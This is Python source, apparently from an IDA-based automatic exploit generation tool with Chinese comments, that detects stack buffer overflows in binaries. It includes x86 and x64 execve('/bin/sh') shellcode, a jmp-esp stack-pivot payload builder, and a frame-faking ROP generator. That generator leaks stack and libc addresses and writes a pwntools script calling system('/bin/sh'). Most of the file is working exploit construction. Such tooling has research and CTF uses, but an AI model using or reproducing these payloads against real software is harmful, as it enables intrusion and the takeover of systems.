#-*- coding:utf-8 -*-
'''
跟缓冲区相关的函数、功能、检测
'''


from AEGconfig import *
from idc import *
from AEGcommon import *
import struct
import AEGfunction
import AEGInstruction
from AEGexceptions import *
from AEGinfo import *
from AEGagent import *

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
shellcode_x64 = "H1\xc9H\xf7\xe1QH\xbb/bin//shSH\x89\xe3\xb0\x0b\xcd\x80"
def StackPivot(offset_BP , filename = INFO_INPUT_FILENAME):
	'''
	Staack Pivoting:栈转移
	必须要有gadget -- jmp esp

	@offset_BP :从缓冲区的位置0，到BP的距离。即：

	|buffer [0] | buffer[1] |...|EBP/RBP

	| <----		offset_BP --->	|   
	
	@filename: 需要找gadget的文件。有时候gadget用的是.so库文件，此时需要指定filename为该so文件
	
	'''
	if INFO_BITS == 32:
		shellcode = shellcode_x86
		fake_bp = struct.pack("I" ,0xdeadbeef)
	else:
		shellcode = shellcode_x64
		fake_bp = struct.pack("Q" ,0xdeadbeefae9caffe)	

	padding_size = offset_BP - len(shellcode)
	printf("Stack Pivot: padding size = %d" % padding_size , verbose= LOG_LEVEL_DEBUG)
	if padding_size < 0 :
		printf("buffer size too small to apply a Stack pivot" , verbose = LOG_LEVEL_WARN) 
		return None


	_gadgets = ROPGadget_agent(addition_cmd=' --only "jmp|ret"')
	
	jmp_esp_gadget = None
	for line in _gadgets:
		if "jmp esp" in line:
			jmp_esp_gadget_int = line.split(':')[0].strip().replace("0x" ,"")
			jmp_esp_gadget_int = int(jmp_esp_gadget_int, base = 16)
			if INFO_BITS == 64:
				jmp_esp_gadget = struct.pack("Q" , jmp_esp_gadget_int)
			else:
				jmp_esp_gadget = struct.pack("I" , jmp_esp_gadget_int)

	#jmp_esp_gadget = Get_ropgadget( filename, 1)
	if jmp_esp_gadget is None:
		printf("No jmp esp gadget. Stack pivoting fail." , verbose=LOG_LEVEL_WARN)
		return None
	printf("find jmp_esp_gadget. %s  Using Tech: Stack pivot" % (jmp_esp_gadget_int))
	
	if INFO_BITS == 32:
		jmp_and_sub_sp_cmd = "print asm('sub esp, 0x%x;jmp esp');" % (offset_BP + (INFO_BITS / 8 ) * 2)
	elif INFO_BITS == 64:
		jmp_and_sub_sp_cmd = "print asm('sub rsp, 0x%x;jmp rsp');" % (offset_BP + (INFO_BITS / 8 ) * 2)
	else:
		raise NotImplementedException("Err INFO_BITS")

	jmp_and_sub_esp = pwntools_agent(jmp_and_sub_sp_cmd)

	#print (hex(jmp_esp_gadget))
	#print (jmp_and_sub_esp)
	shellcode = shellcode + padding_size * 'b' + fake_bp \
				+  jmp_esp_gadget +  jmp_and_sub_esp
	
	printf ("Stack pivot success! final shellcode: " + shellcode)
	return shellcode

def _DetectDangerFuncs():
	'''
	检测方法1：从危险函数出发 ，找到其所有引用，查看是否存在溢出的可能 
	如果溢出，返回 (压入参数的指令地址，总输入长度(size) , 输入的地方距离BP的长度)
	'''
	

	def _sizeCheck(arg_addr):
		'''
		@arg_addr: 要检查的参数所在指令的地址。
					比如  0x8048123: push $0xa		
		'''
		instr = AEGInstruction.AEG_Instruction(arg_addr)
		_op = instr.GetOperator()
		printf("_size check::%x" % arg_addr , verbose=LOG_LEVEL_DEBUG)
		if _op == 'push':
			_size = instr.GetOperand(0)
			printf( "Pushing operand(size) to arg : " + str(_size) , verbose=LOG_LEVEL_DEBUG)
		elif _op == "mov":
			## mov [ESP + xxx], $imm
			_size = instr.GetOperand(1)
			if 'h' in _size.lower():
				_size = int(_size.lower().strip('h') , base=16)
			else:
				_size = int(_size , base = 10)
			printf( "Moving operand(size) to arg : " + str(_size),verbose=LOG_LEVEL_DEBUG)
		else:
			raise NotImplementedException('_op = ' + _op)
		return _size

	def _bufferCheck(arg_addr):
		instr = AEGInstruction.AEG_Instruction(arg_addr)
		_op = instr.GetOperator()
		#print type(instr.GetStackVar(1))
		if _op == 'push':
			buffer_opnd = instr.GetOperand(0)
			print "pushing operand (buffer) to arg :" + str(buffer_opnd)
		elif _op == "mov":
			buffer_opnd = instr.GetOperand(1)
			print "moving operand (buffer) to arg :" + str(buffer_opnd)
		else:
			raise NotImplementedException()

		### buffer类型可能会有通过寄存器来完成压栈的情况，需要向上寻找。
		buffer_opnd_type = instr.GetOpndType(1)
		if buffer_opnd_type == o_reg:
			function_head = AEGfunction.AEG_GetFunctionHead(instr.addr)
			_tmp_addr = instr.addr
			_stack_var = None
			while True:
				_tmp_addr = idc.PrevHead(_tmp_addr)
				printf("buffer check ::Checking tmp_addr: %x" % _tmp_addr , verbose=LOG_LEVEL_DEBUG )
				_instr_dec = AEGInstruction.AEG_Instruction(_tmp_addr)
				_op = _instr_dec.GetOperator().lower()
				if _op in ("ret", "retn", "jmp", "b") or _tmp_addr < function_head:
					printf("Encounter control flow changes" , verbose=LOG_LEVEL_DEBUG)
					raise NotImplementedException()
					
				elif _op == "lea" and _instr_dec.GetOperand(0) == buffer_opnd:
					_stack_var = _instr_dec.GetStackVar(1)
					if  _stack_var !=  None:
						
						printf("Find a stack var that pass to args: %x  %x." % (instr.addr, _instr_dec.addr))
						_stack_var_name = _instr_dec.GetOperand(1).strip('[').strip(']').replace(
							'ebp' if INFO_BITS == 32 else 'rbp' , '').replace('''+''','')
						return _stack_var_name
					else:
						printf("Not stack var (%x) " % _tmp_addr)
						break
				elif _op == "mov" and _instr_dec.GetOperand(0)== buffer_opnd:
					## 
					raise NotImplementedException()
					op_type = _instr_dec.GetOpndType(1)
					if op_type == o_reg :
						opnd = _instr_dec.GetOperand(1)
						raise NotImplementedException()
					else:
						raise NotImplementedException()
		pass


	D_funcs = AEGfunction.AEG_GetDangerousFunctions()
	printf("Got Dangerous Functions" +str(D_funcs) ,
			verbose=LOG_LEVEL_DEBUG)

	for danger_func in D_funcs :
		xrefs = AEG_GetCodeXrefsTo(danger_func.addr)
		for xref in xrefs:
			if AEGInstruction.AEG_AnalyseRefs(xref) == 'call':
				printf("Find a call to danger func:%s" % danger_func ,verbose=LOG_LEVEL_DEBUG)
				all_args = AEGfunction.AEG_GetFuncArgs(xref)
				printf(map(hex ,all_args) , verbose=LOG_LEVEL_DEBUG)


				_unlimited = False
				## size check 
				if hasattr(danger_func , 'size_idx'):
					_size = _sizeCheck(all_args[danger_func.size_idx]) 
					if _size is None:
						## size check fail
						printf("Size check fail at %x" % all_args[danger_func.size_idx] , verbose=LOG_LEVEL_WARN)
						return None
					
				else: 
					## 没有size_idx属性，比如gets之类的函数，一定溢出
					_unlimited = True

				### buffer check
				_stack_var_name = _bufferCheck(all_args[danger_func.buffer_idx])
				if _stack_var_name is None:
					printf("Buffer check fail." , verbose=LOG_LEVEL_WARN)
					return None
				import AEGframe
				_offset = AEGframe.get_stack_arg_offset(
							all_args[danger_func.buffer_idx],
							_stack_var_name
							)
				if _offset < 0:
					_offset = 0 - _offset
				if _unlimited or  _size > _offset:
					printf("Buffer overflow found! xref: %x" % xref)
					return xref , _size , _offset

			else:
				raise NotImplementedException()



def FrameFaking(input_size , offset_BP , xref):


	def _GetStackSize():
		### 获得[ebp] 与 esp 的距离
		gdb_agent()
		#printf(gdb_output , verbose=LOG_LEVEL_DEBUG)
		with open(os.path.join(INFO_INPUT_FILEPATH , "gdboutput.txt") ,"r") as f:
			lines = f.read().split('\n')
			#print lines
			_top = int(lines[0].split('=')[1].strip() , base=16)
			_bottom = int(lines[1].split(':')[1].strip(),base = 16)
			#printf("top = %s(%s) , button = %s(%s)" % (_top , type(_top) , _bottom , type(_bottom)) ,verbose = LOG_LEVEL_DEBUG)
			return  _bottom - _top

	def _RecvStackBottom():
		script.addHackCode(r'''_t = p.recvuntil('\x7f')''')
		script.addHackCode('''while len(_t) < %d :''' % (6 if INFO_BITS == 64 else 4))
		script.addHackCode(r'''_t += p.recvuntil('\x7f')''' , moreTabs=1)
		script.setHackCodeTabs(-1)

	script = ScriptFiller()
	script.setProcessName(INFO_INPUT_FILENAME)

	#### 这里还需要一个检测的过程--最好使用sendafter,比如此例中，最好使用sendafter('>' ,xxxx)
	### 检测在read函数之前出现的所有有关输出 TODO
	
	### first run : leak stack address
	'''
		p.sendafter(">", 'a' * 80)
		p.recvuntil('a'*80)
	'''
	script.addHackCode('''p.send('a'*{:d})'''.format(offset_BP))
	script.addHackCode('''p.recvuntil('a'*{:d})'''.format(offset_BP))

	### 接收栈地址。我们这里假设使用的是puts函数打印，由于puts函数不会自己补\0，因此会把BP的值打印出来。
	## 接收方式有点问题：可能不是7f开头，甚至可能不是6个字节
	# 对于其他方式的：TODO
	'''
		_t = p.recvuntil('\x7f')
		while len(_t) < 6:
			_t += p.recvuntil("\x7f")
	'''
	_RecvStackBottom()

	### 算出stack
	stack_size = _GetStackSize()
	script.addHackCode(r'''stack = u64(_t.ljust(8, '\0')) - ''' + hex(stack_size))

	## 求gadget : pop rdi ; ret
	out = ROPGadget_agent(addition_cmd= '--only "pop|ret"')
	pop_rdi_ret_gadget = None
	#printf(out , verbose=LOG_LEVEL_DEBUG)
	for line in out:
		if "pop rdi ; ret" in line:
			pop_rdi_ret_gadget = int(line.split(':')[0].strip(),base = 16)
			break
	
	if pop_rdi_ret_gadget is None:
		printf("No 'pop rdi ; ret' gadget. Frame Faking Fail." , verbose=LOG_LEVEL_WARN)
		return None
	
	leave_ret_gadget = None 
	out = ROPGadget_agent('ROPgadget --binary over --only "leave|ret"')
	for line in out:
		if "leave ; ret" in line:
			leave_ret_gadget = int(line.split(':')[0].strip() , base = 16)
			break
	if leave_ret_gadget is None:
		printf("No 'leave ; ret' gadget. Frame Faking Fail." , verbose=LOG_LEVEL_WARN)
		return None
	
	### 发送第一个payload，leak puts的地址。
	### 注意在这里最好用sendafter，但现在没有指示输出什么，所以只用send
	script.addHackCode(r'''p.send(flat( ['11111111' , {:x} , elf.got['puts'] , elf.plt['puts'], {:x}, {:d}*'1' , stack , {:x}] , word_size={:d} , sign = False))'''.format(
						pop_rdi_ret_gadget , 
						AEGfunction.AEG_GetFunctionHead(xref) , 
						offset_BP - (INFO_BITS / 8) * 5 ,
						leave_ret_gadget, 
						INFO_BITS
	))

	### 接收下一个地址(puts函数的地址)
	### TODO:64位与32位不同。这里先略过
	script.addHackCode(r'''p.recvline()''')
	_RecvStackBottom()
	script.addHackCode(r'''libc.address = u64(_t.ljust(8 ,'\x00')) - libc.sym['puts']''')

	### 有了libc的基地址，就可以实行ROP了.再次进行Frame Faking
	### TODO: 从puts函数返回xref所在函数时，需要知道栈比原来偏移了多少。这里先写0x30

	script.addHackCode(r'''p.send(flat(['22222222' , {:x} , next(libc.search('/bin/sh')) , libc.sym['system'] , {:d}*'2' , stack-0x30 , {:x}]))'''.format(
		pop_rdi_ret_gadget,
		(offset_BP - INFO_BITS / 8 * 4) ,
		leave_ret_gadget
	))

	script.dump(filename=INFO_INPUT_FILENAME +".FrameFaking.atk.py")
	return True


def BufferOverflowDetector():
	_tmp = _DetectDangerFuncs()
	if _tmp is not None:
		xref_addr , input_size , offset_BP = _tmp
		printf("input_size = %d, ofsset_bp = %d" % (input_size , offset_BP) , verbose=LOG_LEVEL_DEBUG)
		shellcode = StackPivot(offset_BP)
		if not shellcode:
			### Fake Frame
			if FrameFaking(input_size , offset_BP,xref_addr):
				printf("Frame Faking success! See *.atk.py")
		else:
			## 保存shellcode
			AEG_save_file(INFO_INPUT_FILENAME + ".stackpivot",shellcode,"wb")
	else :
		raise NotImplementedException()
	pass
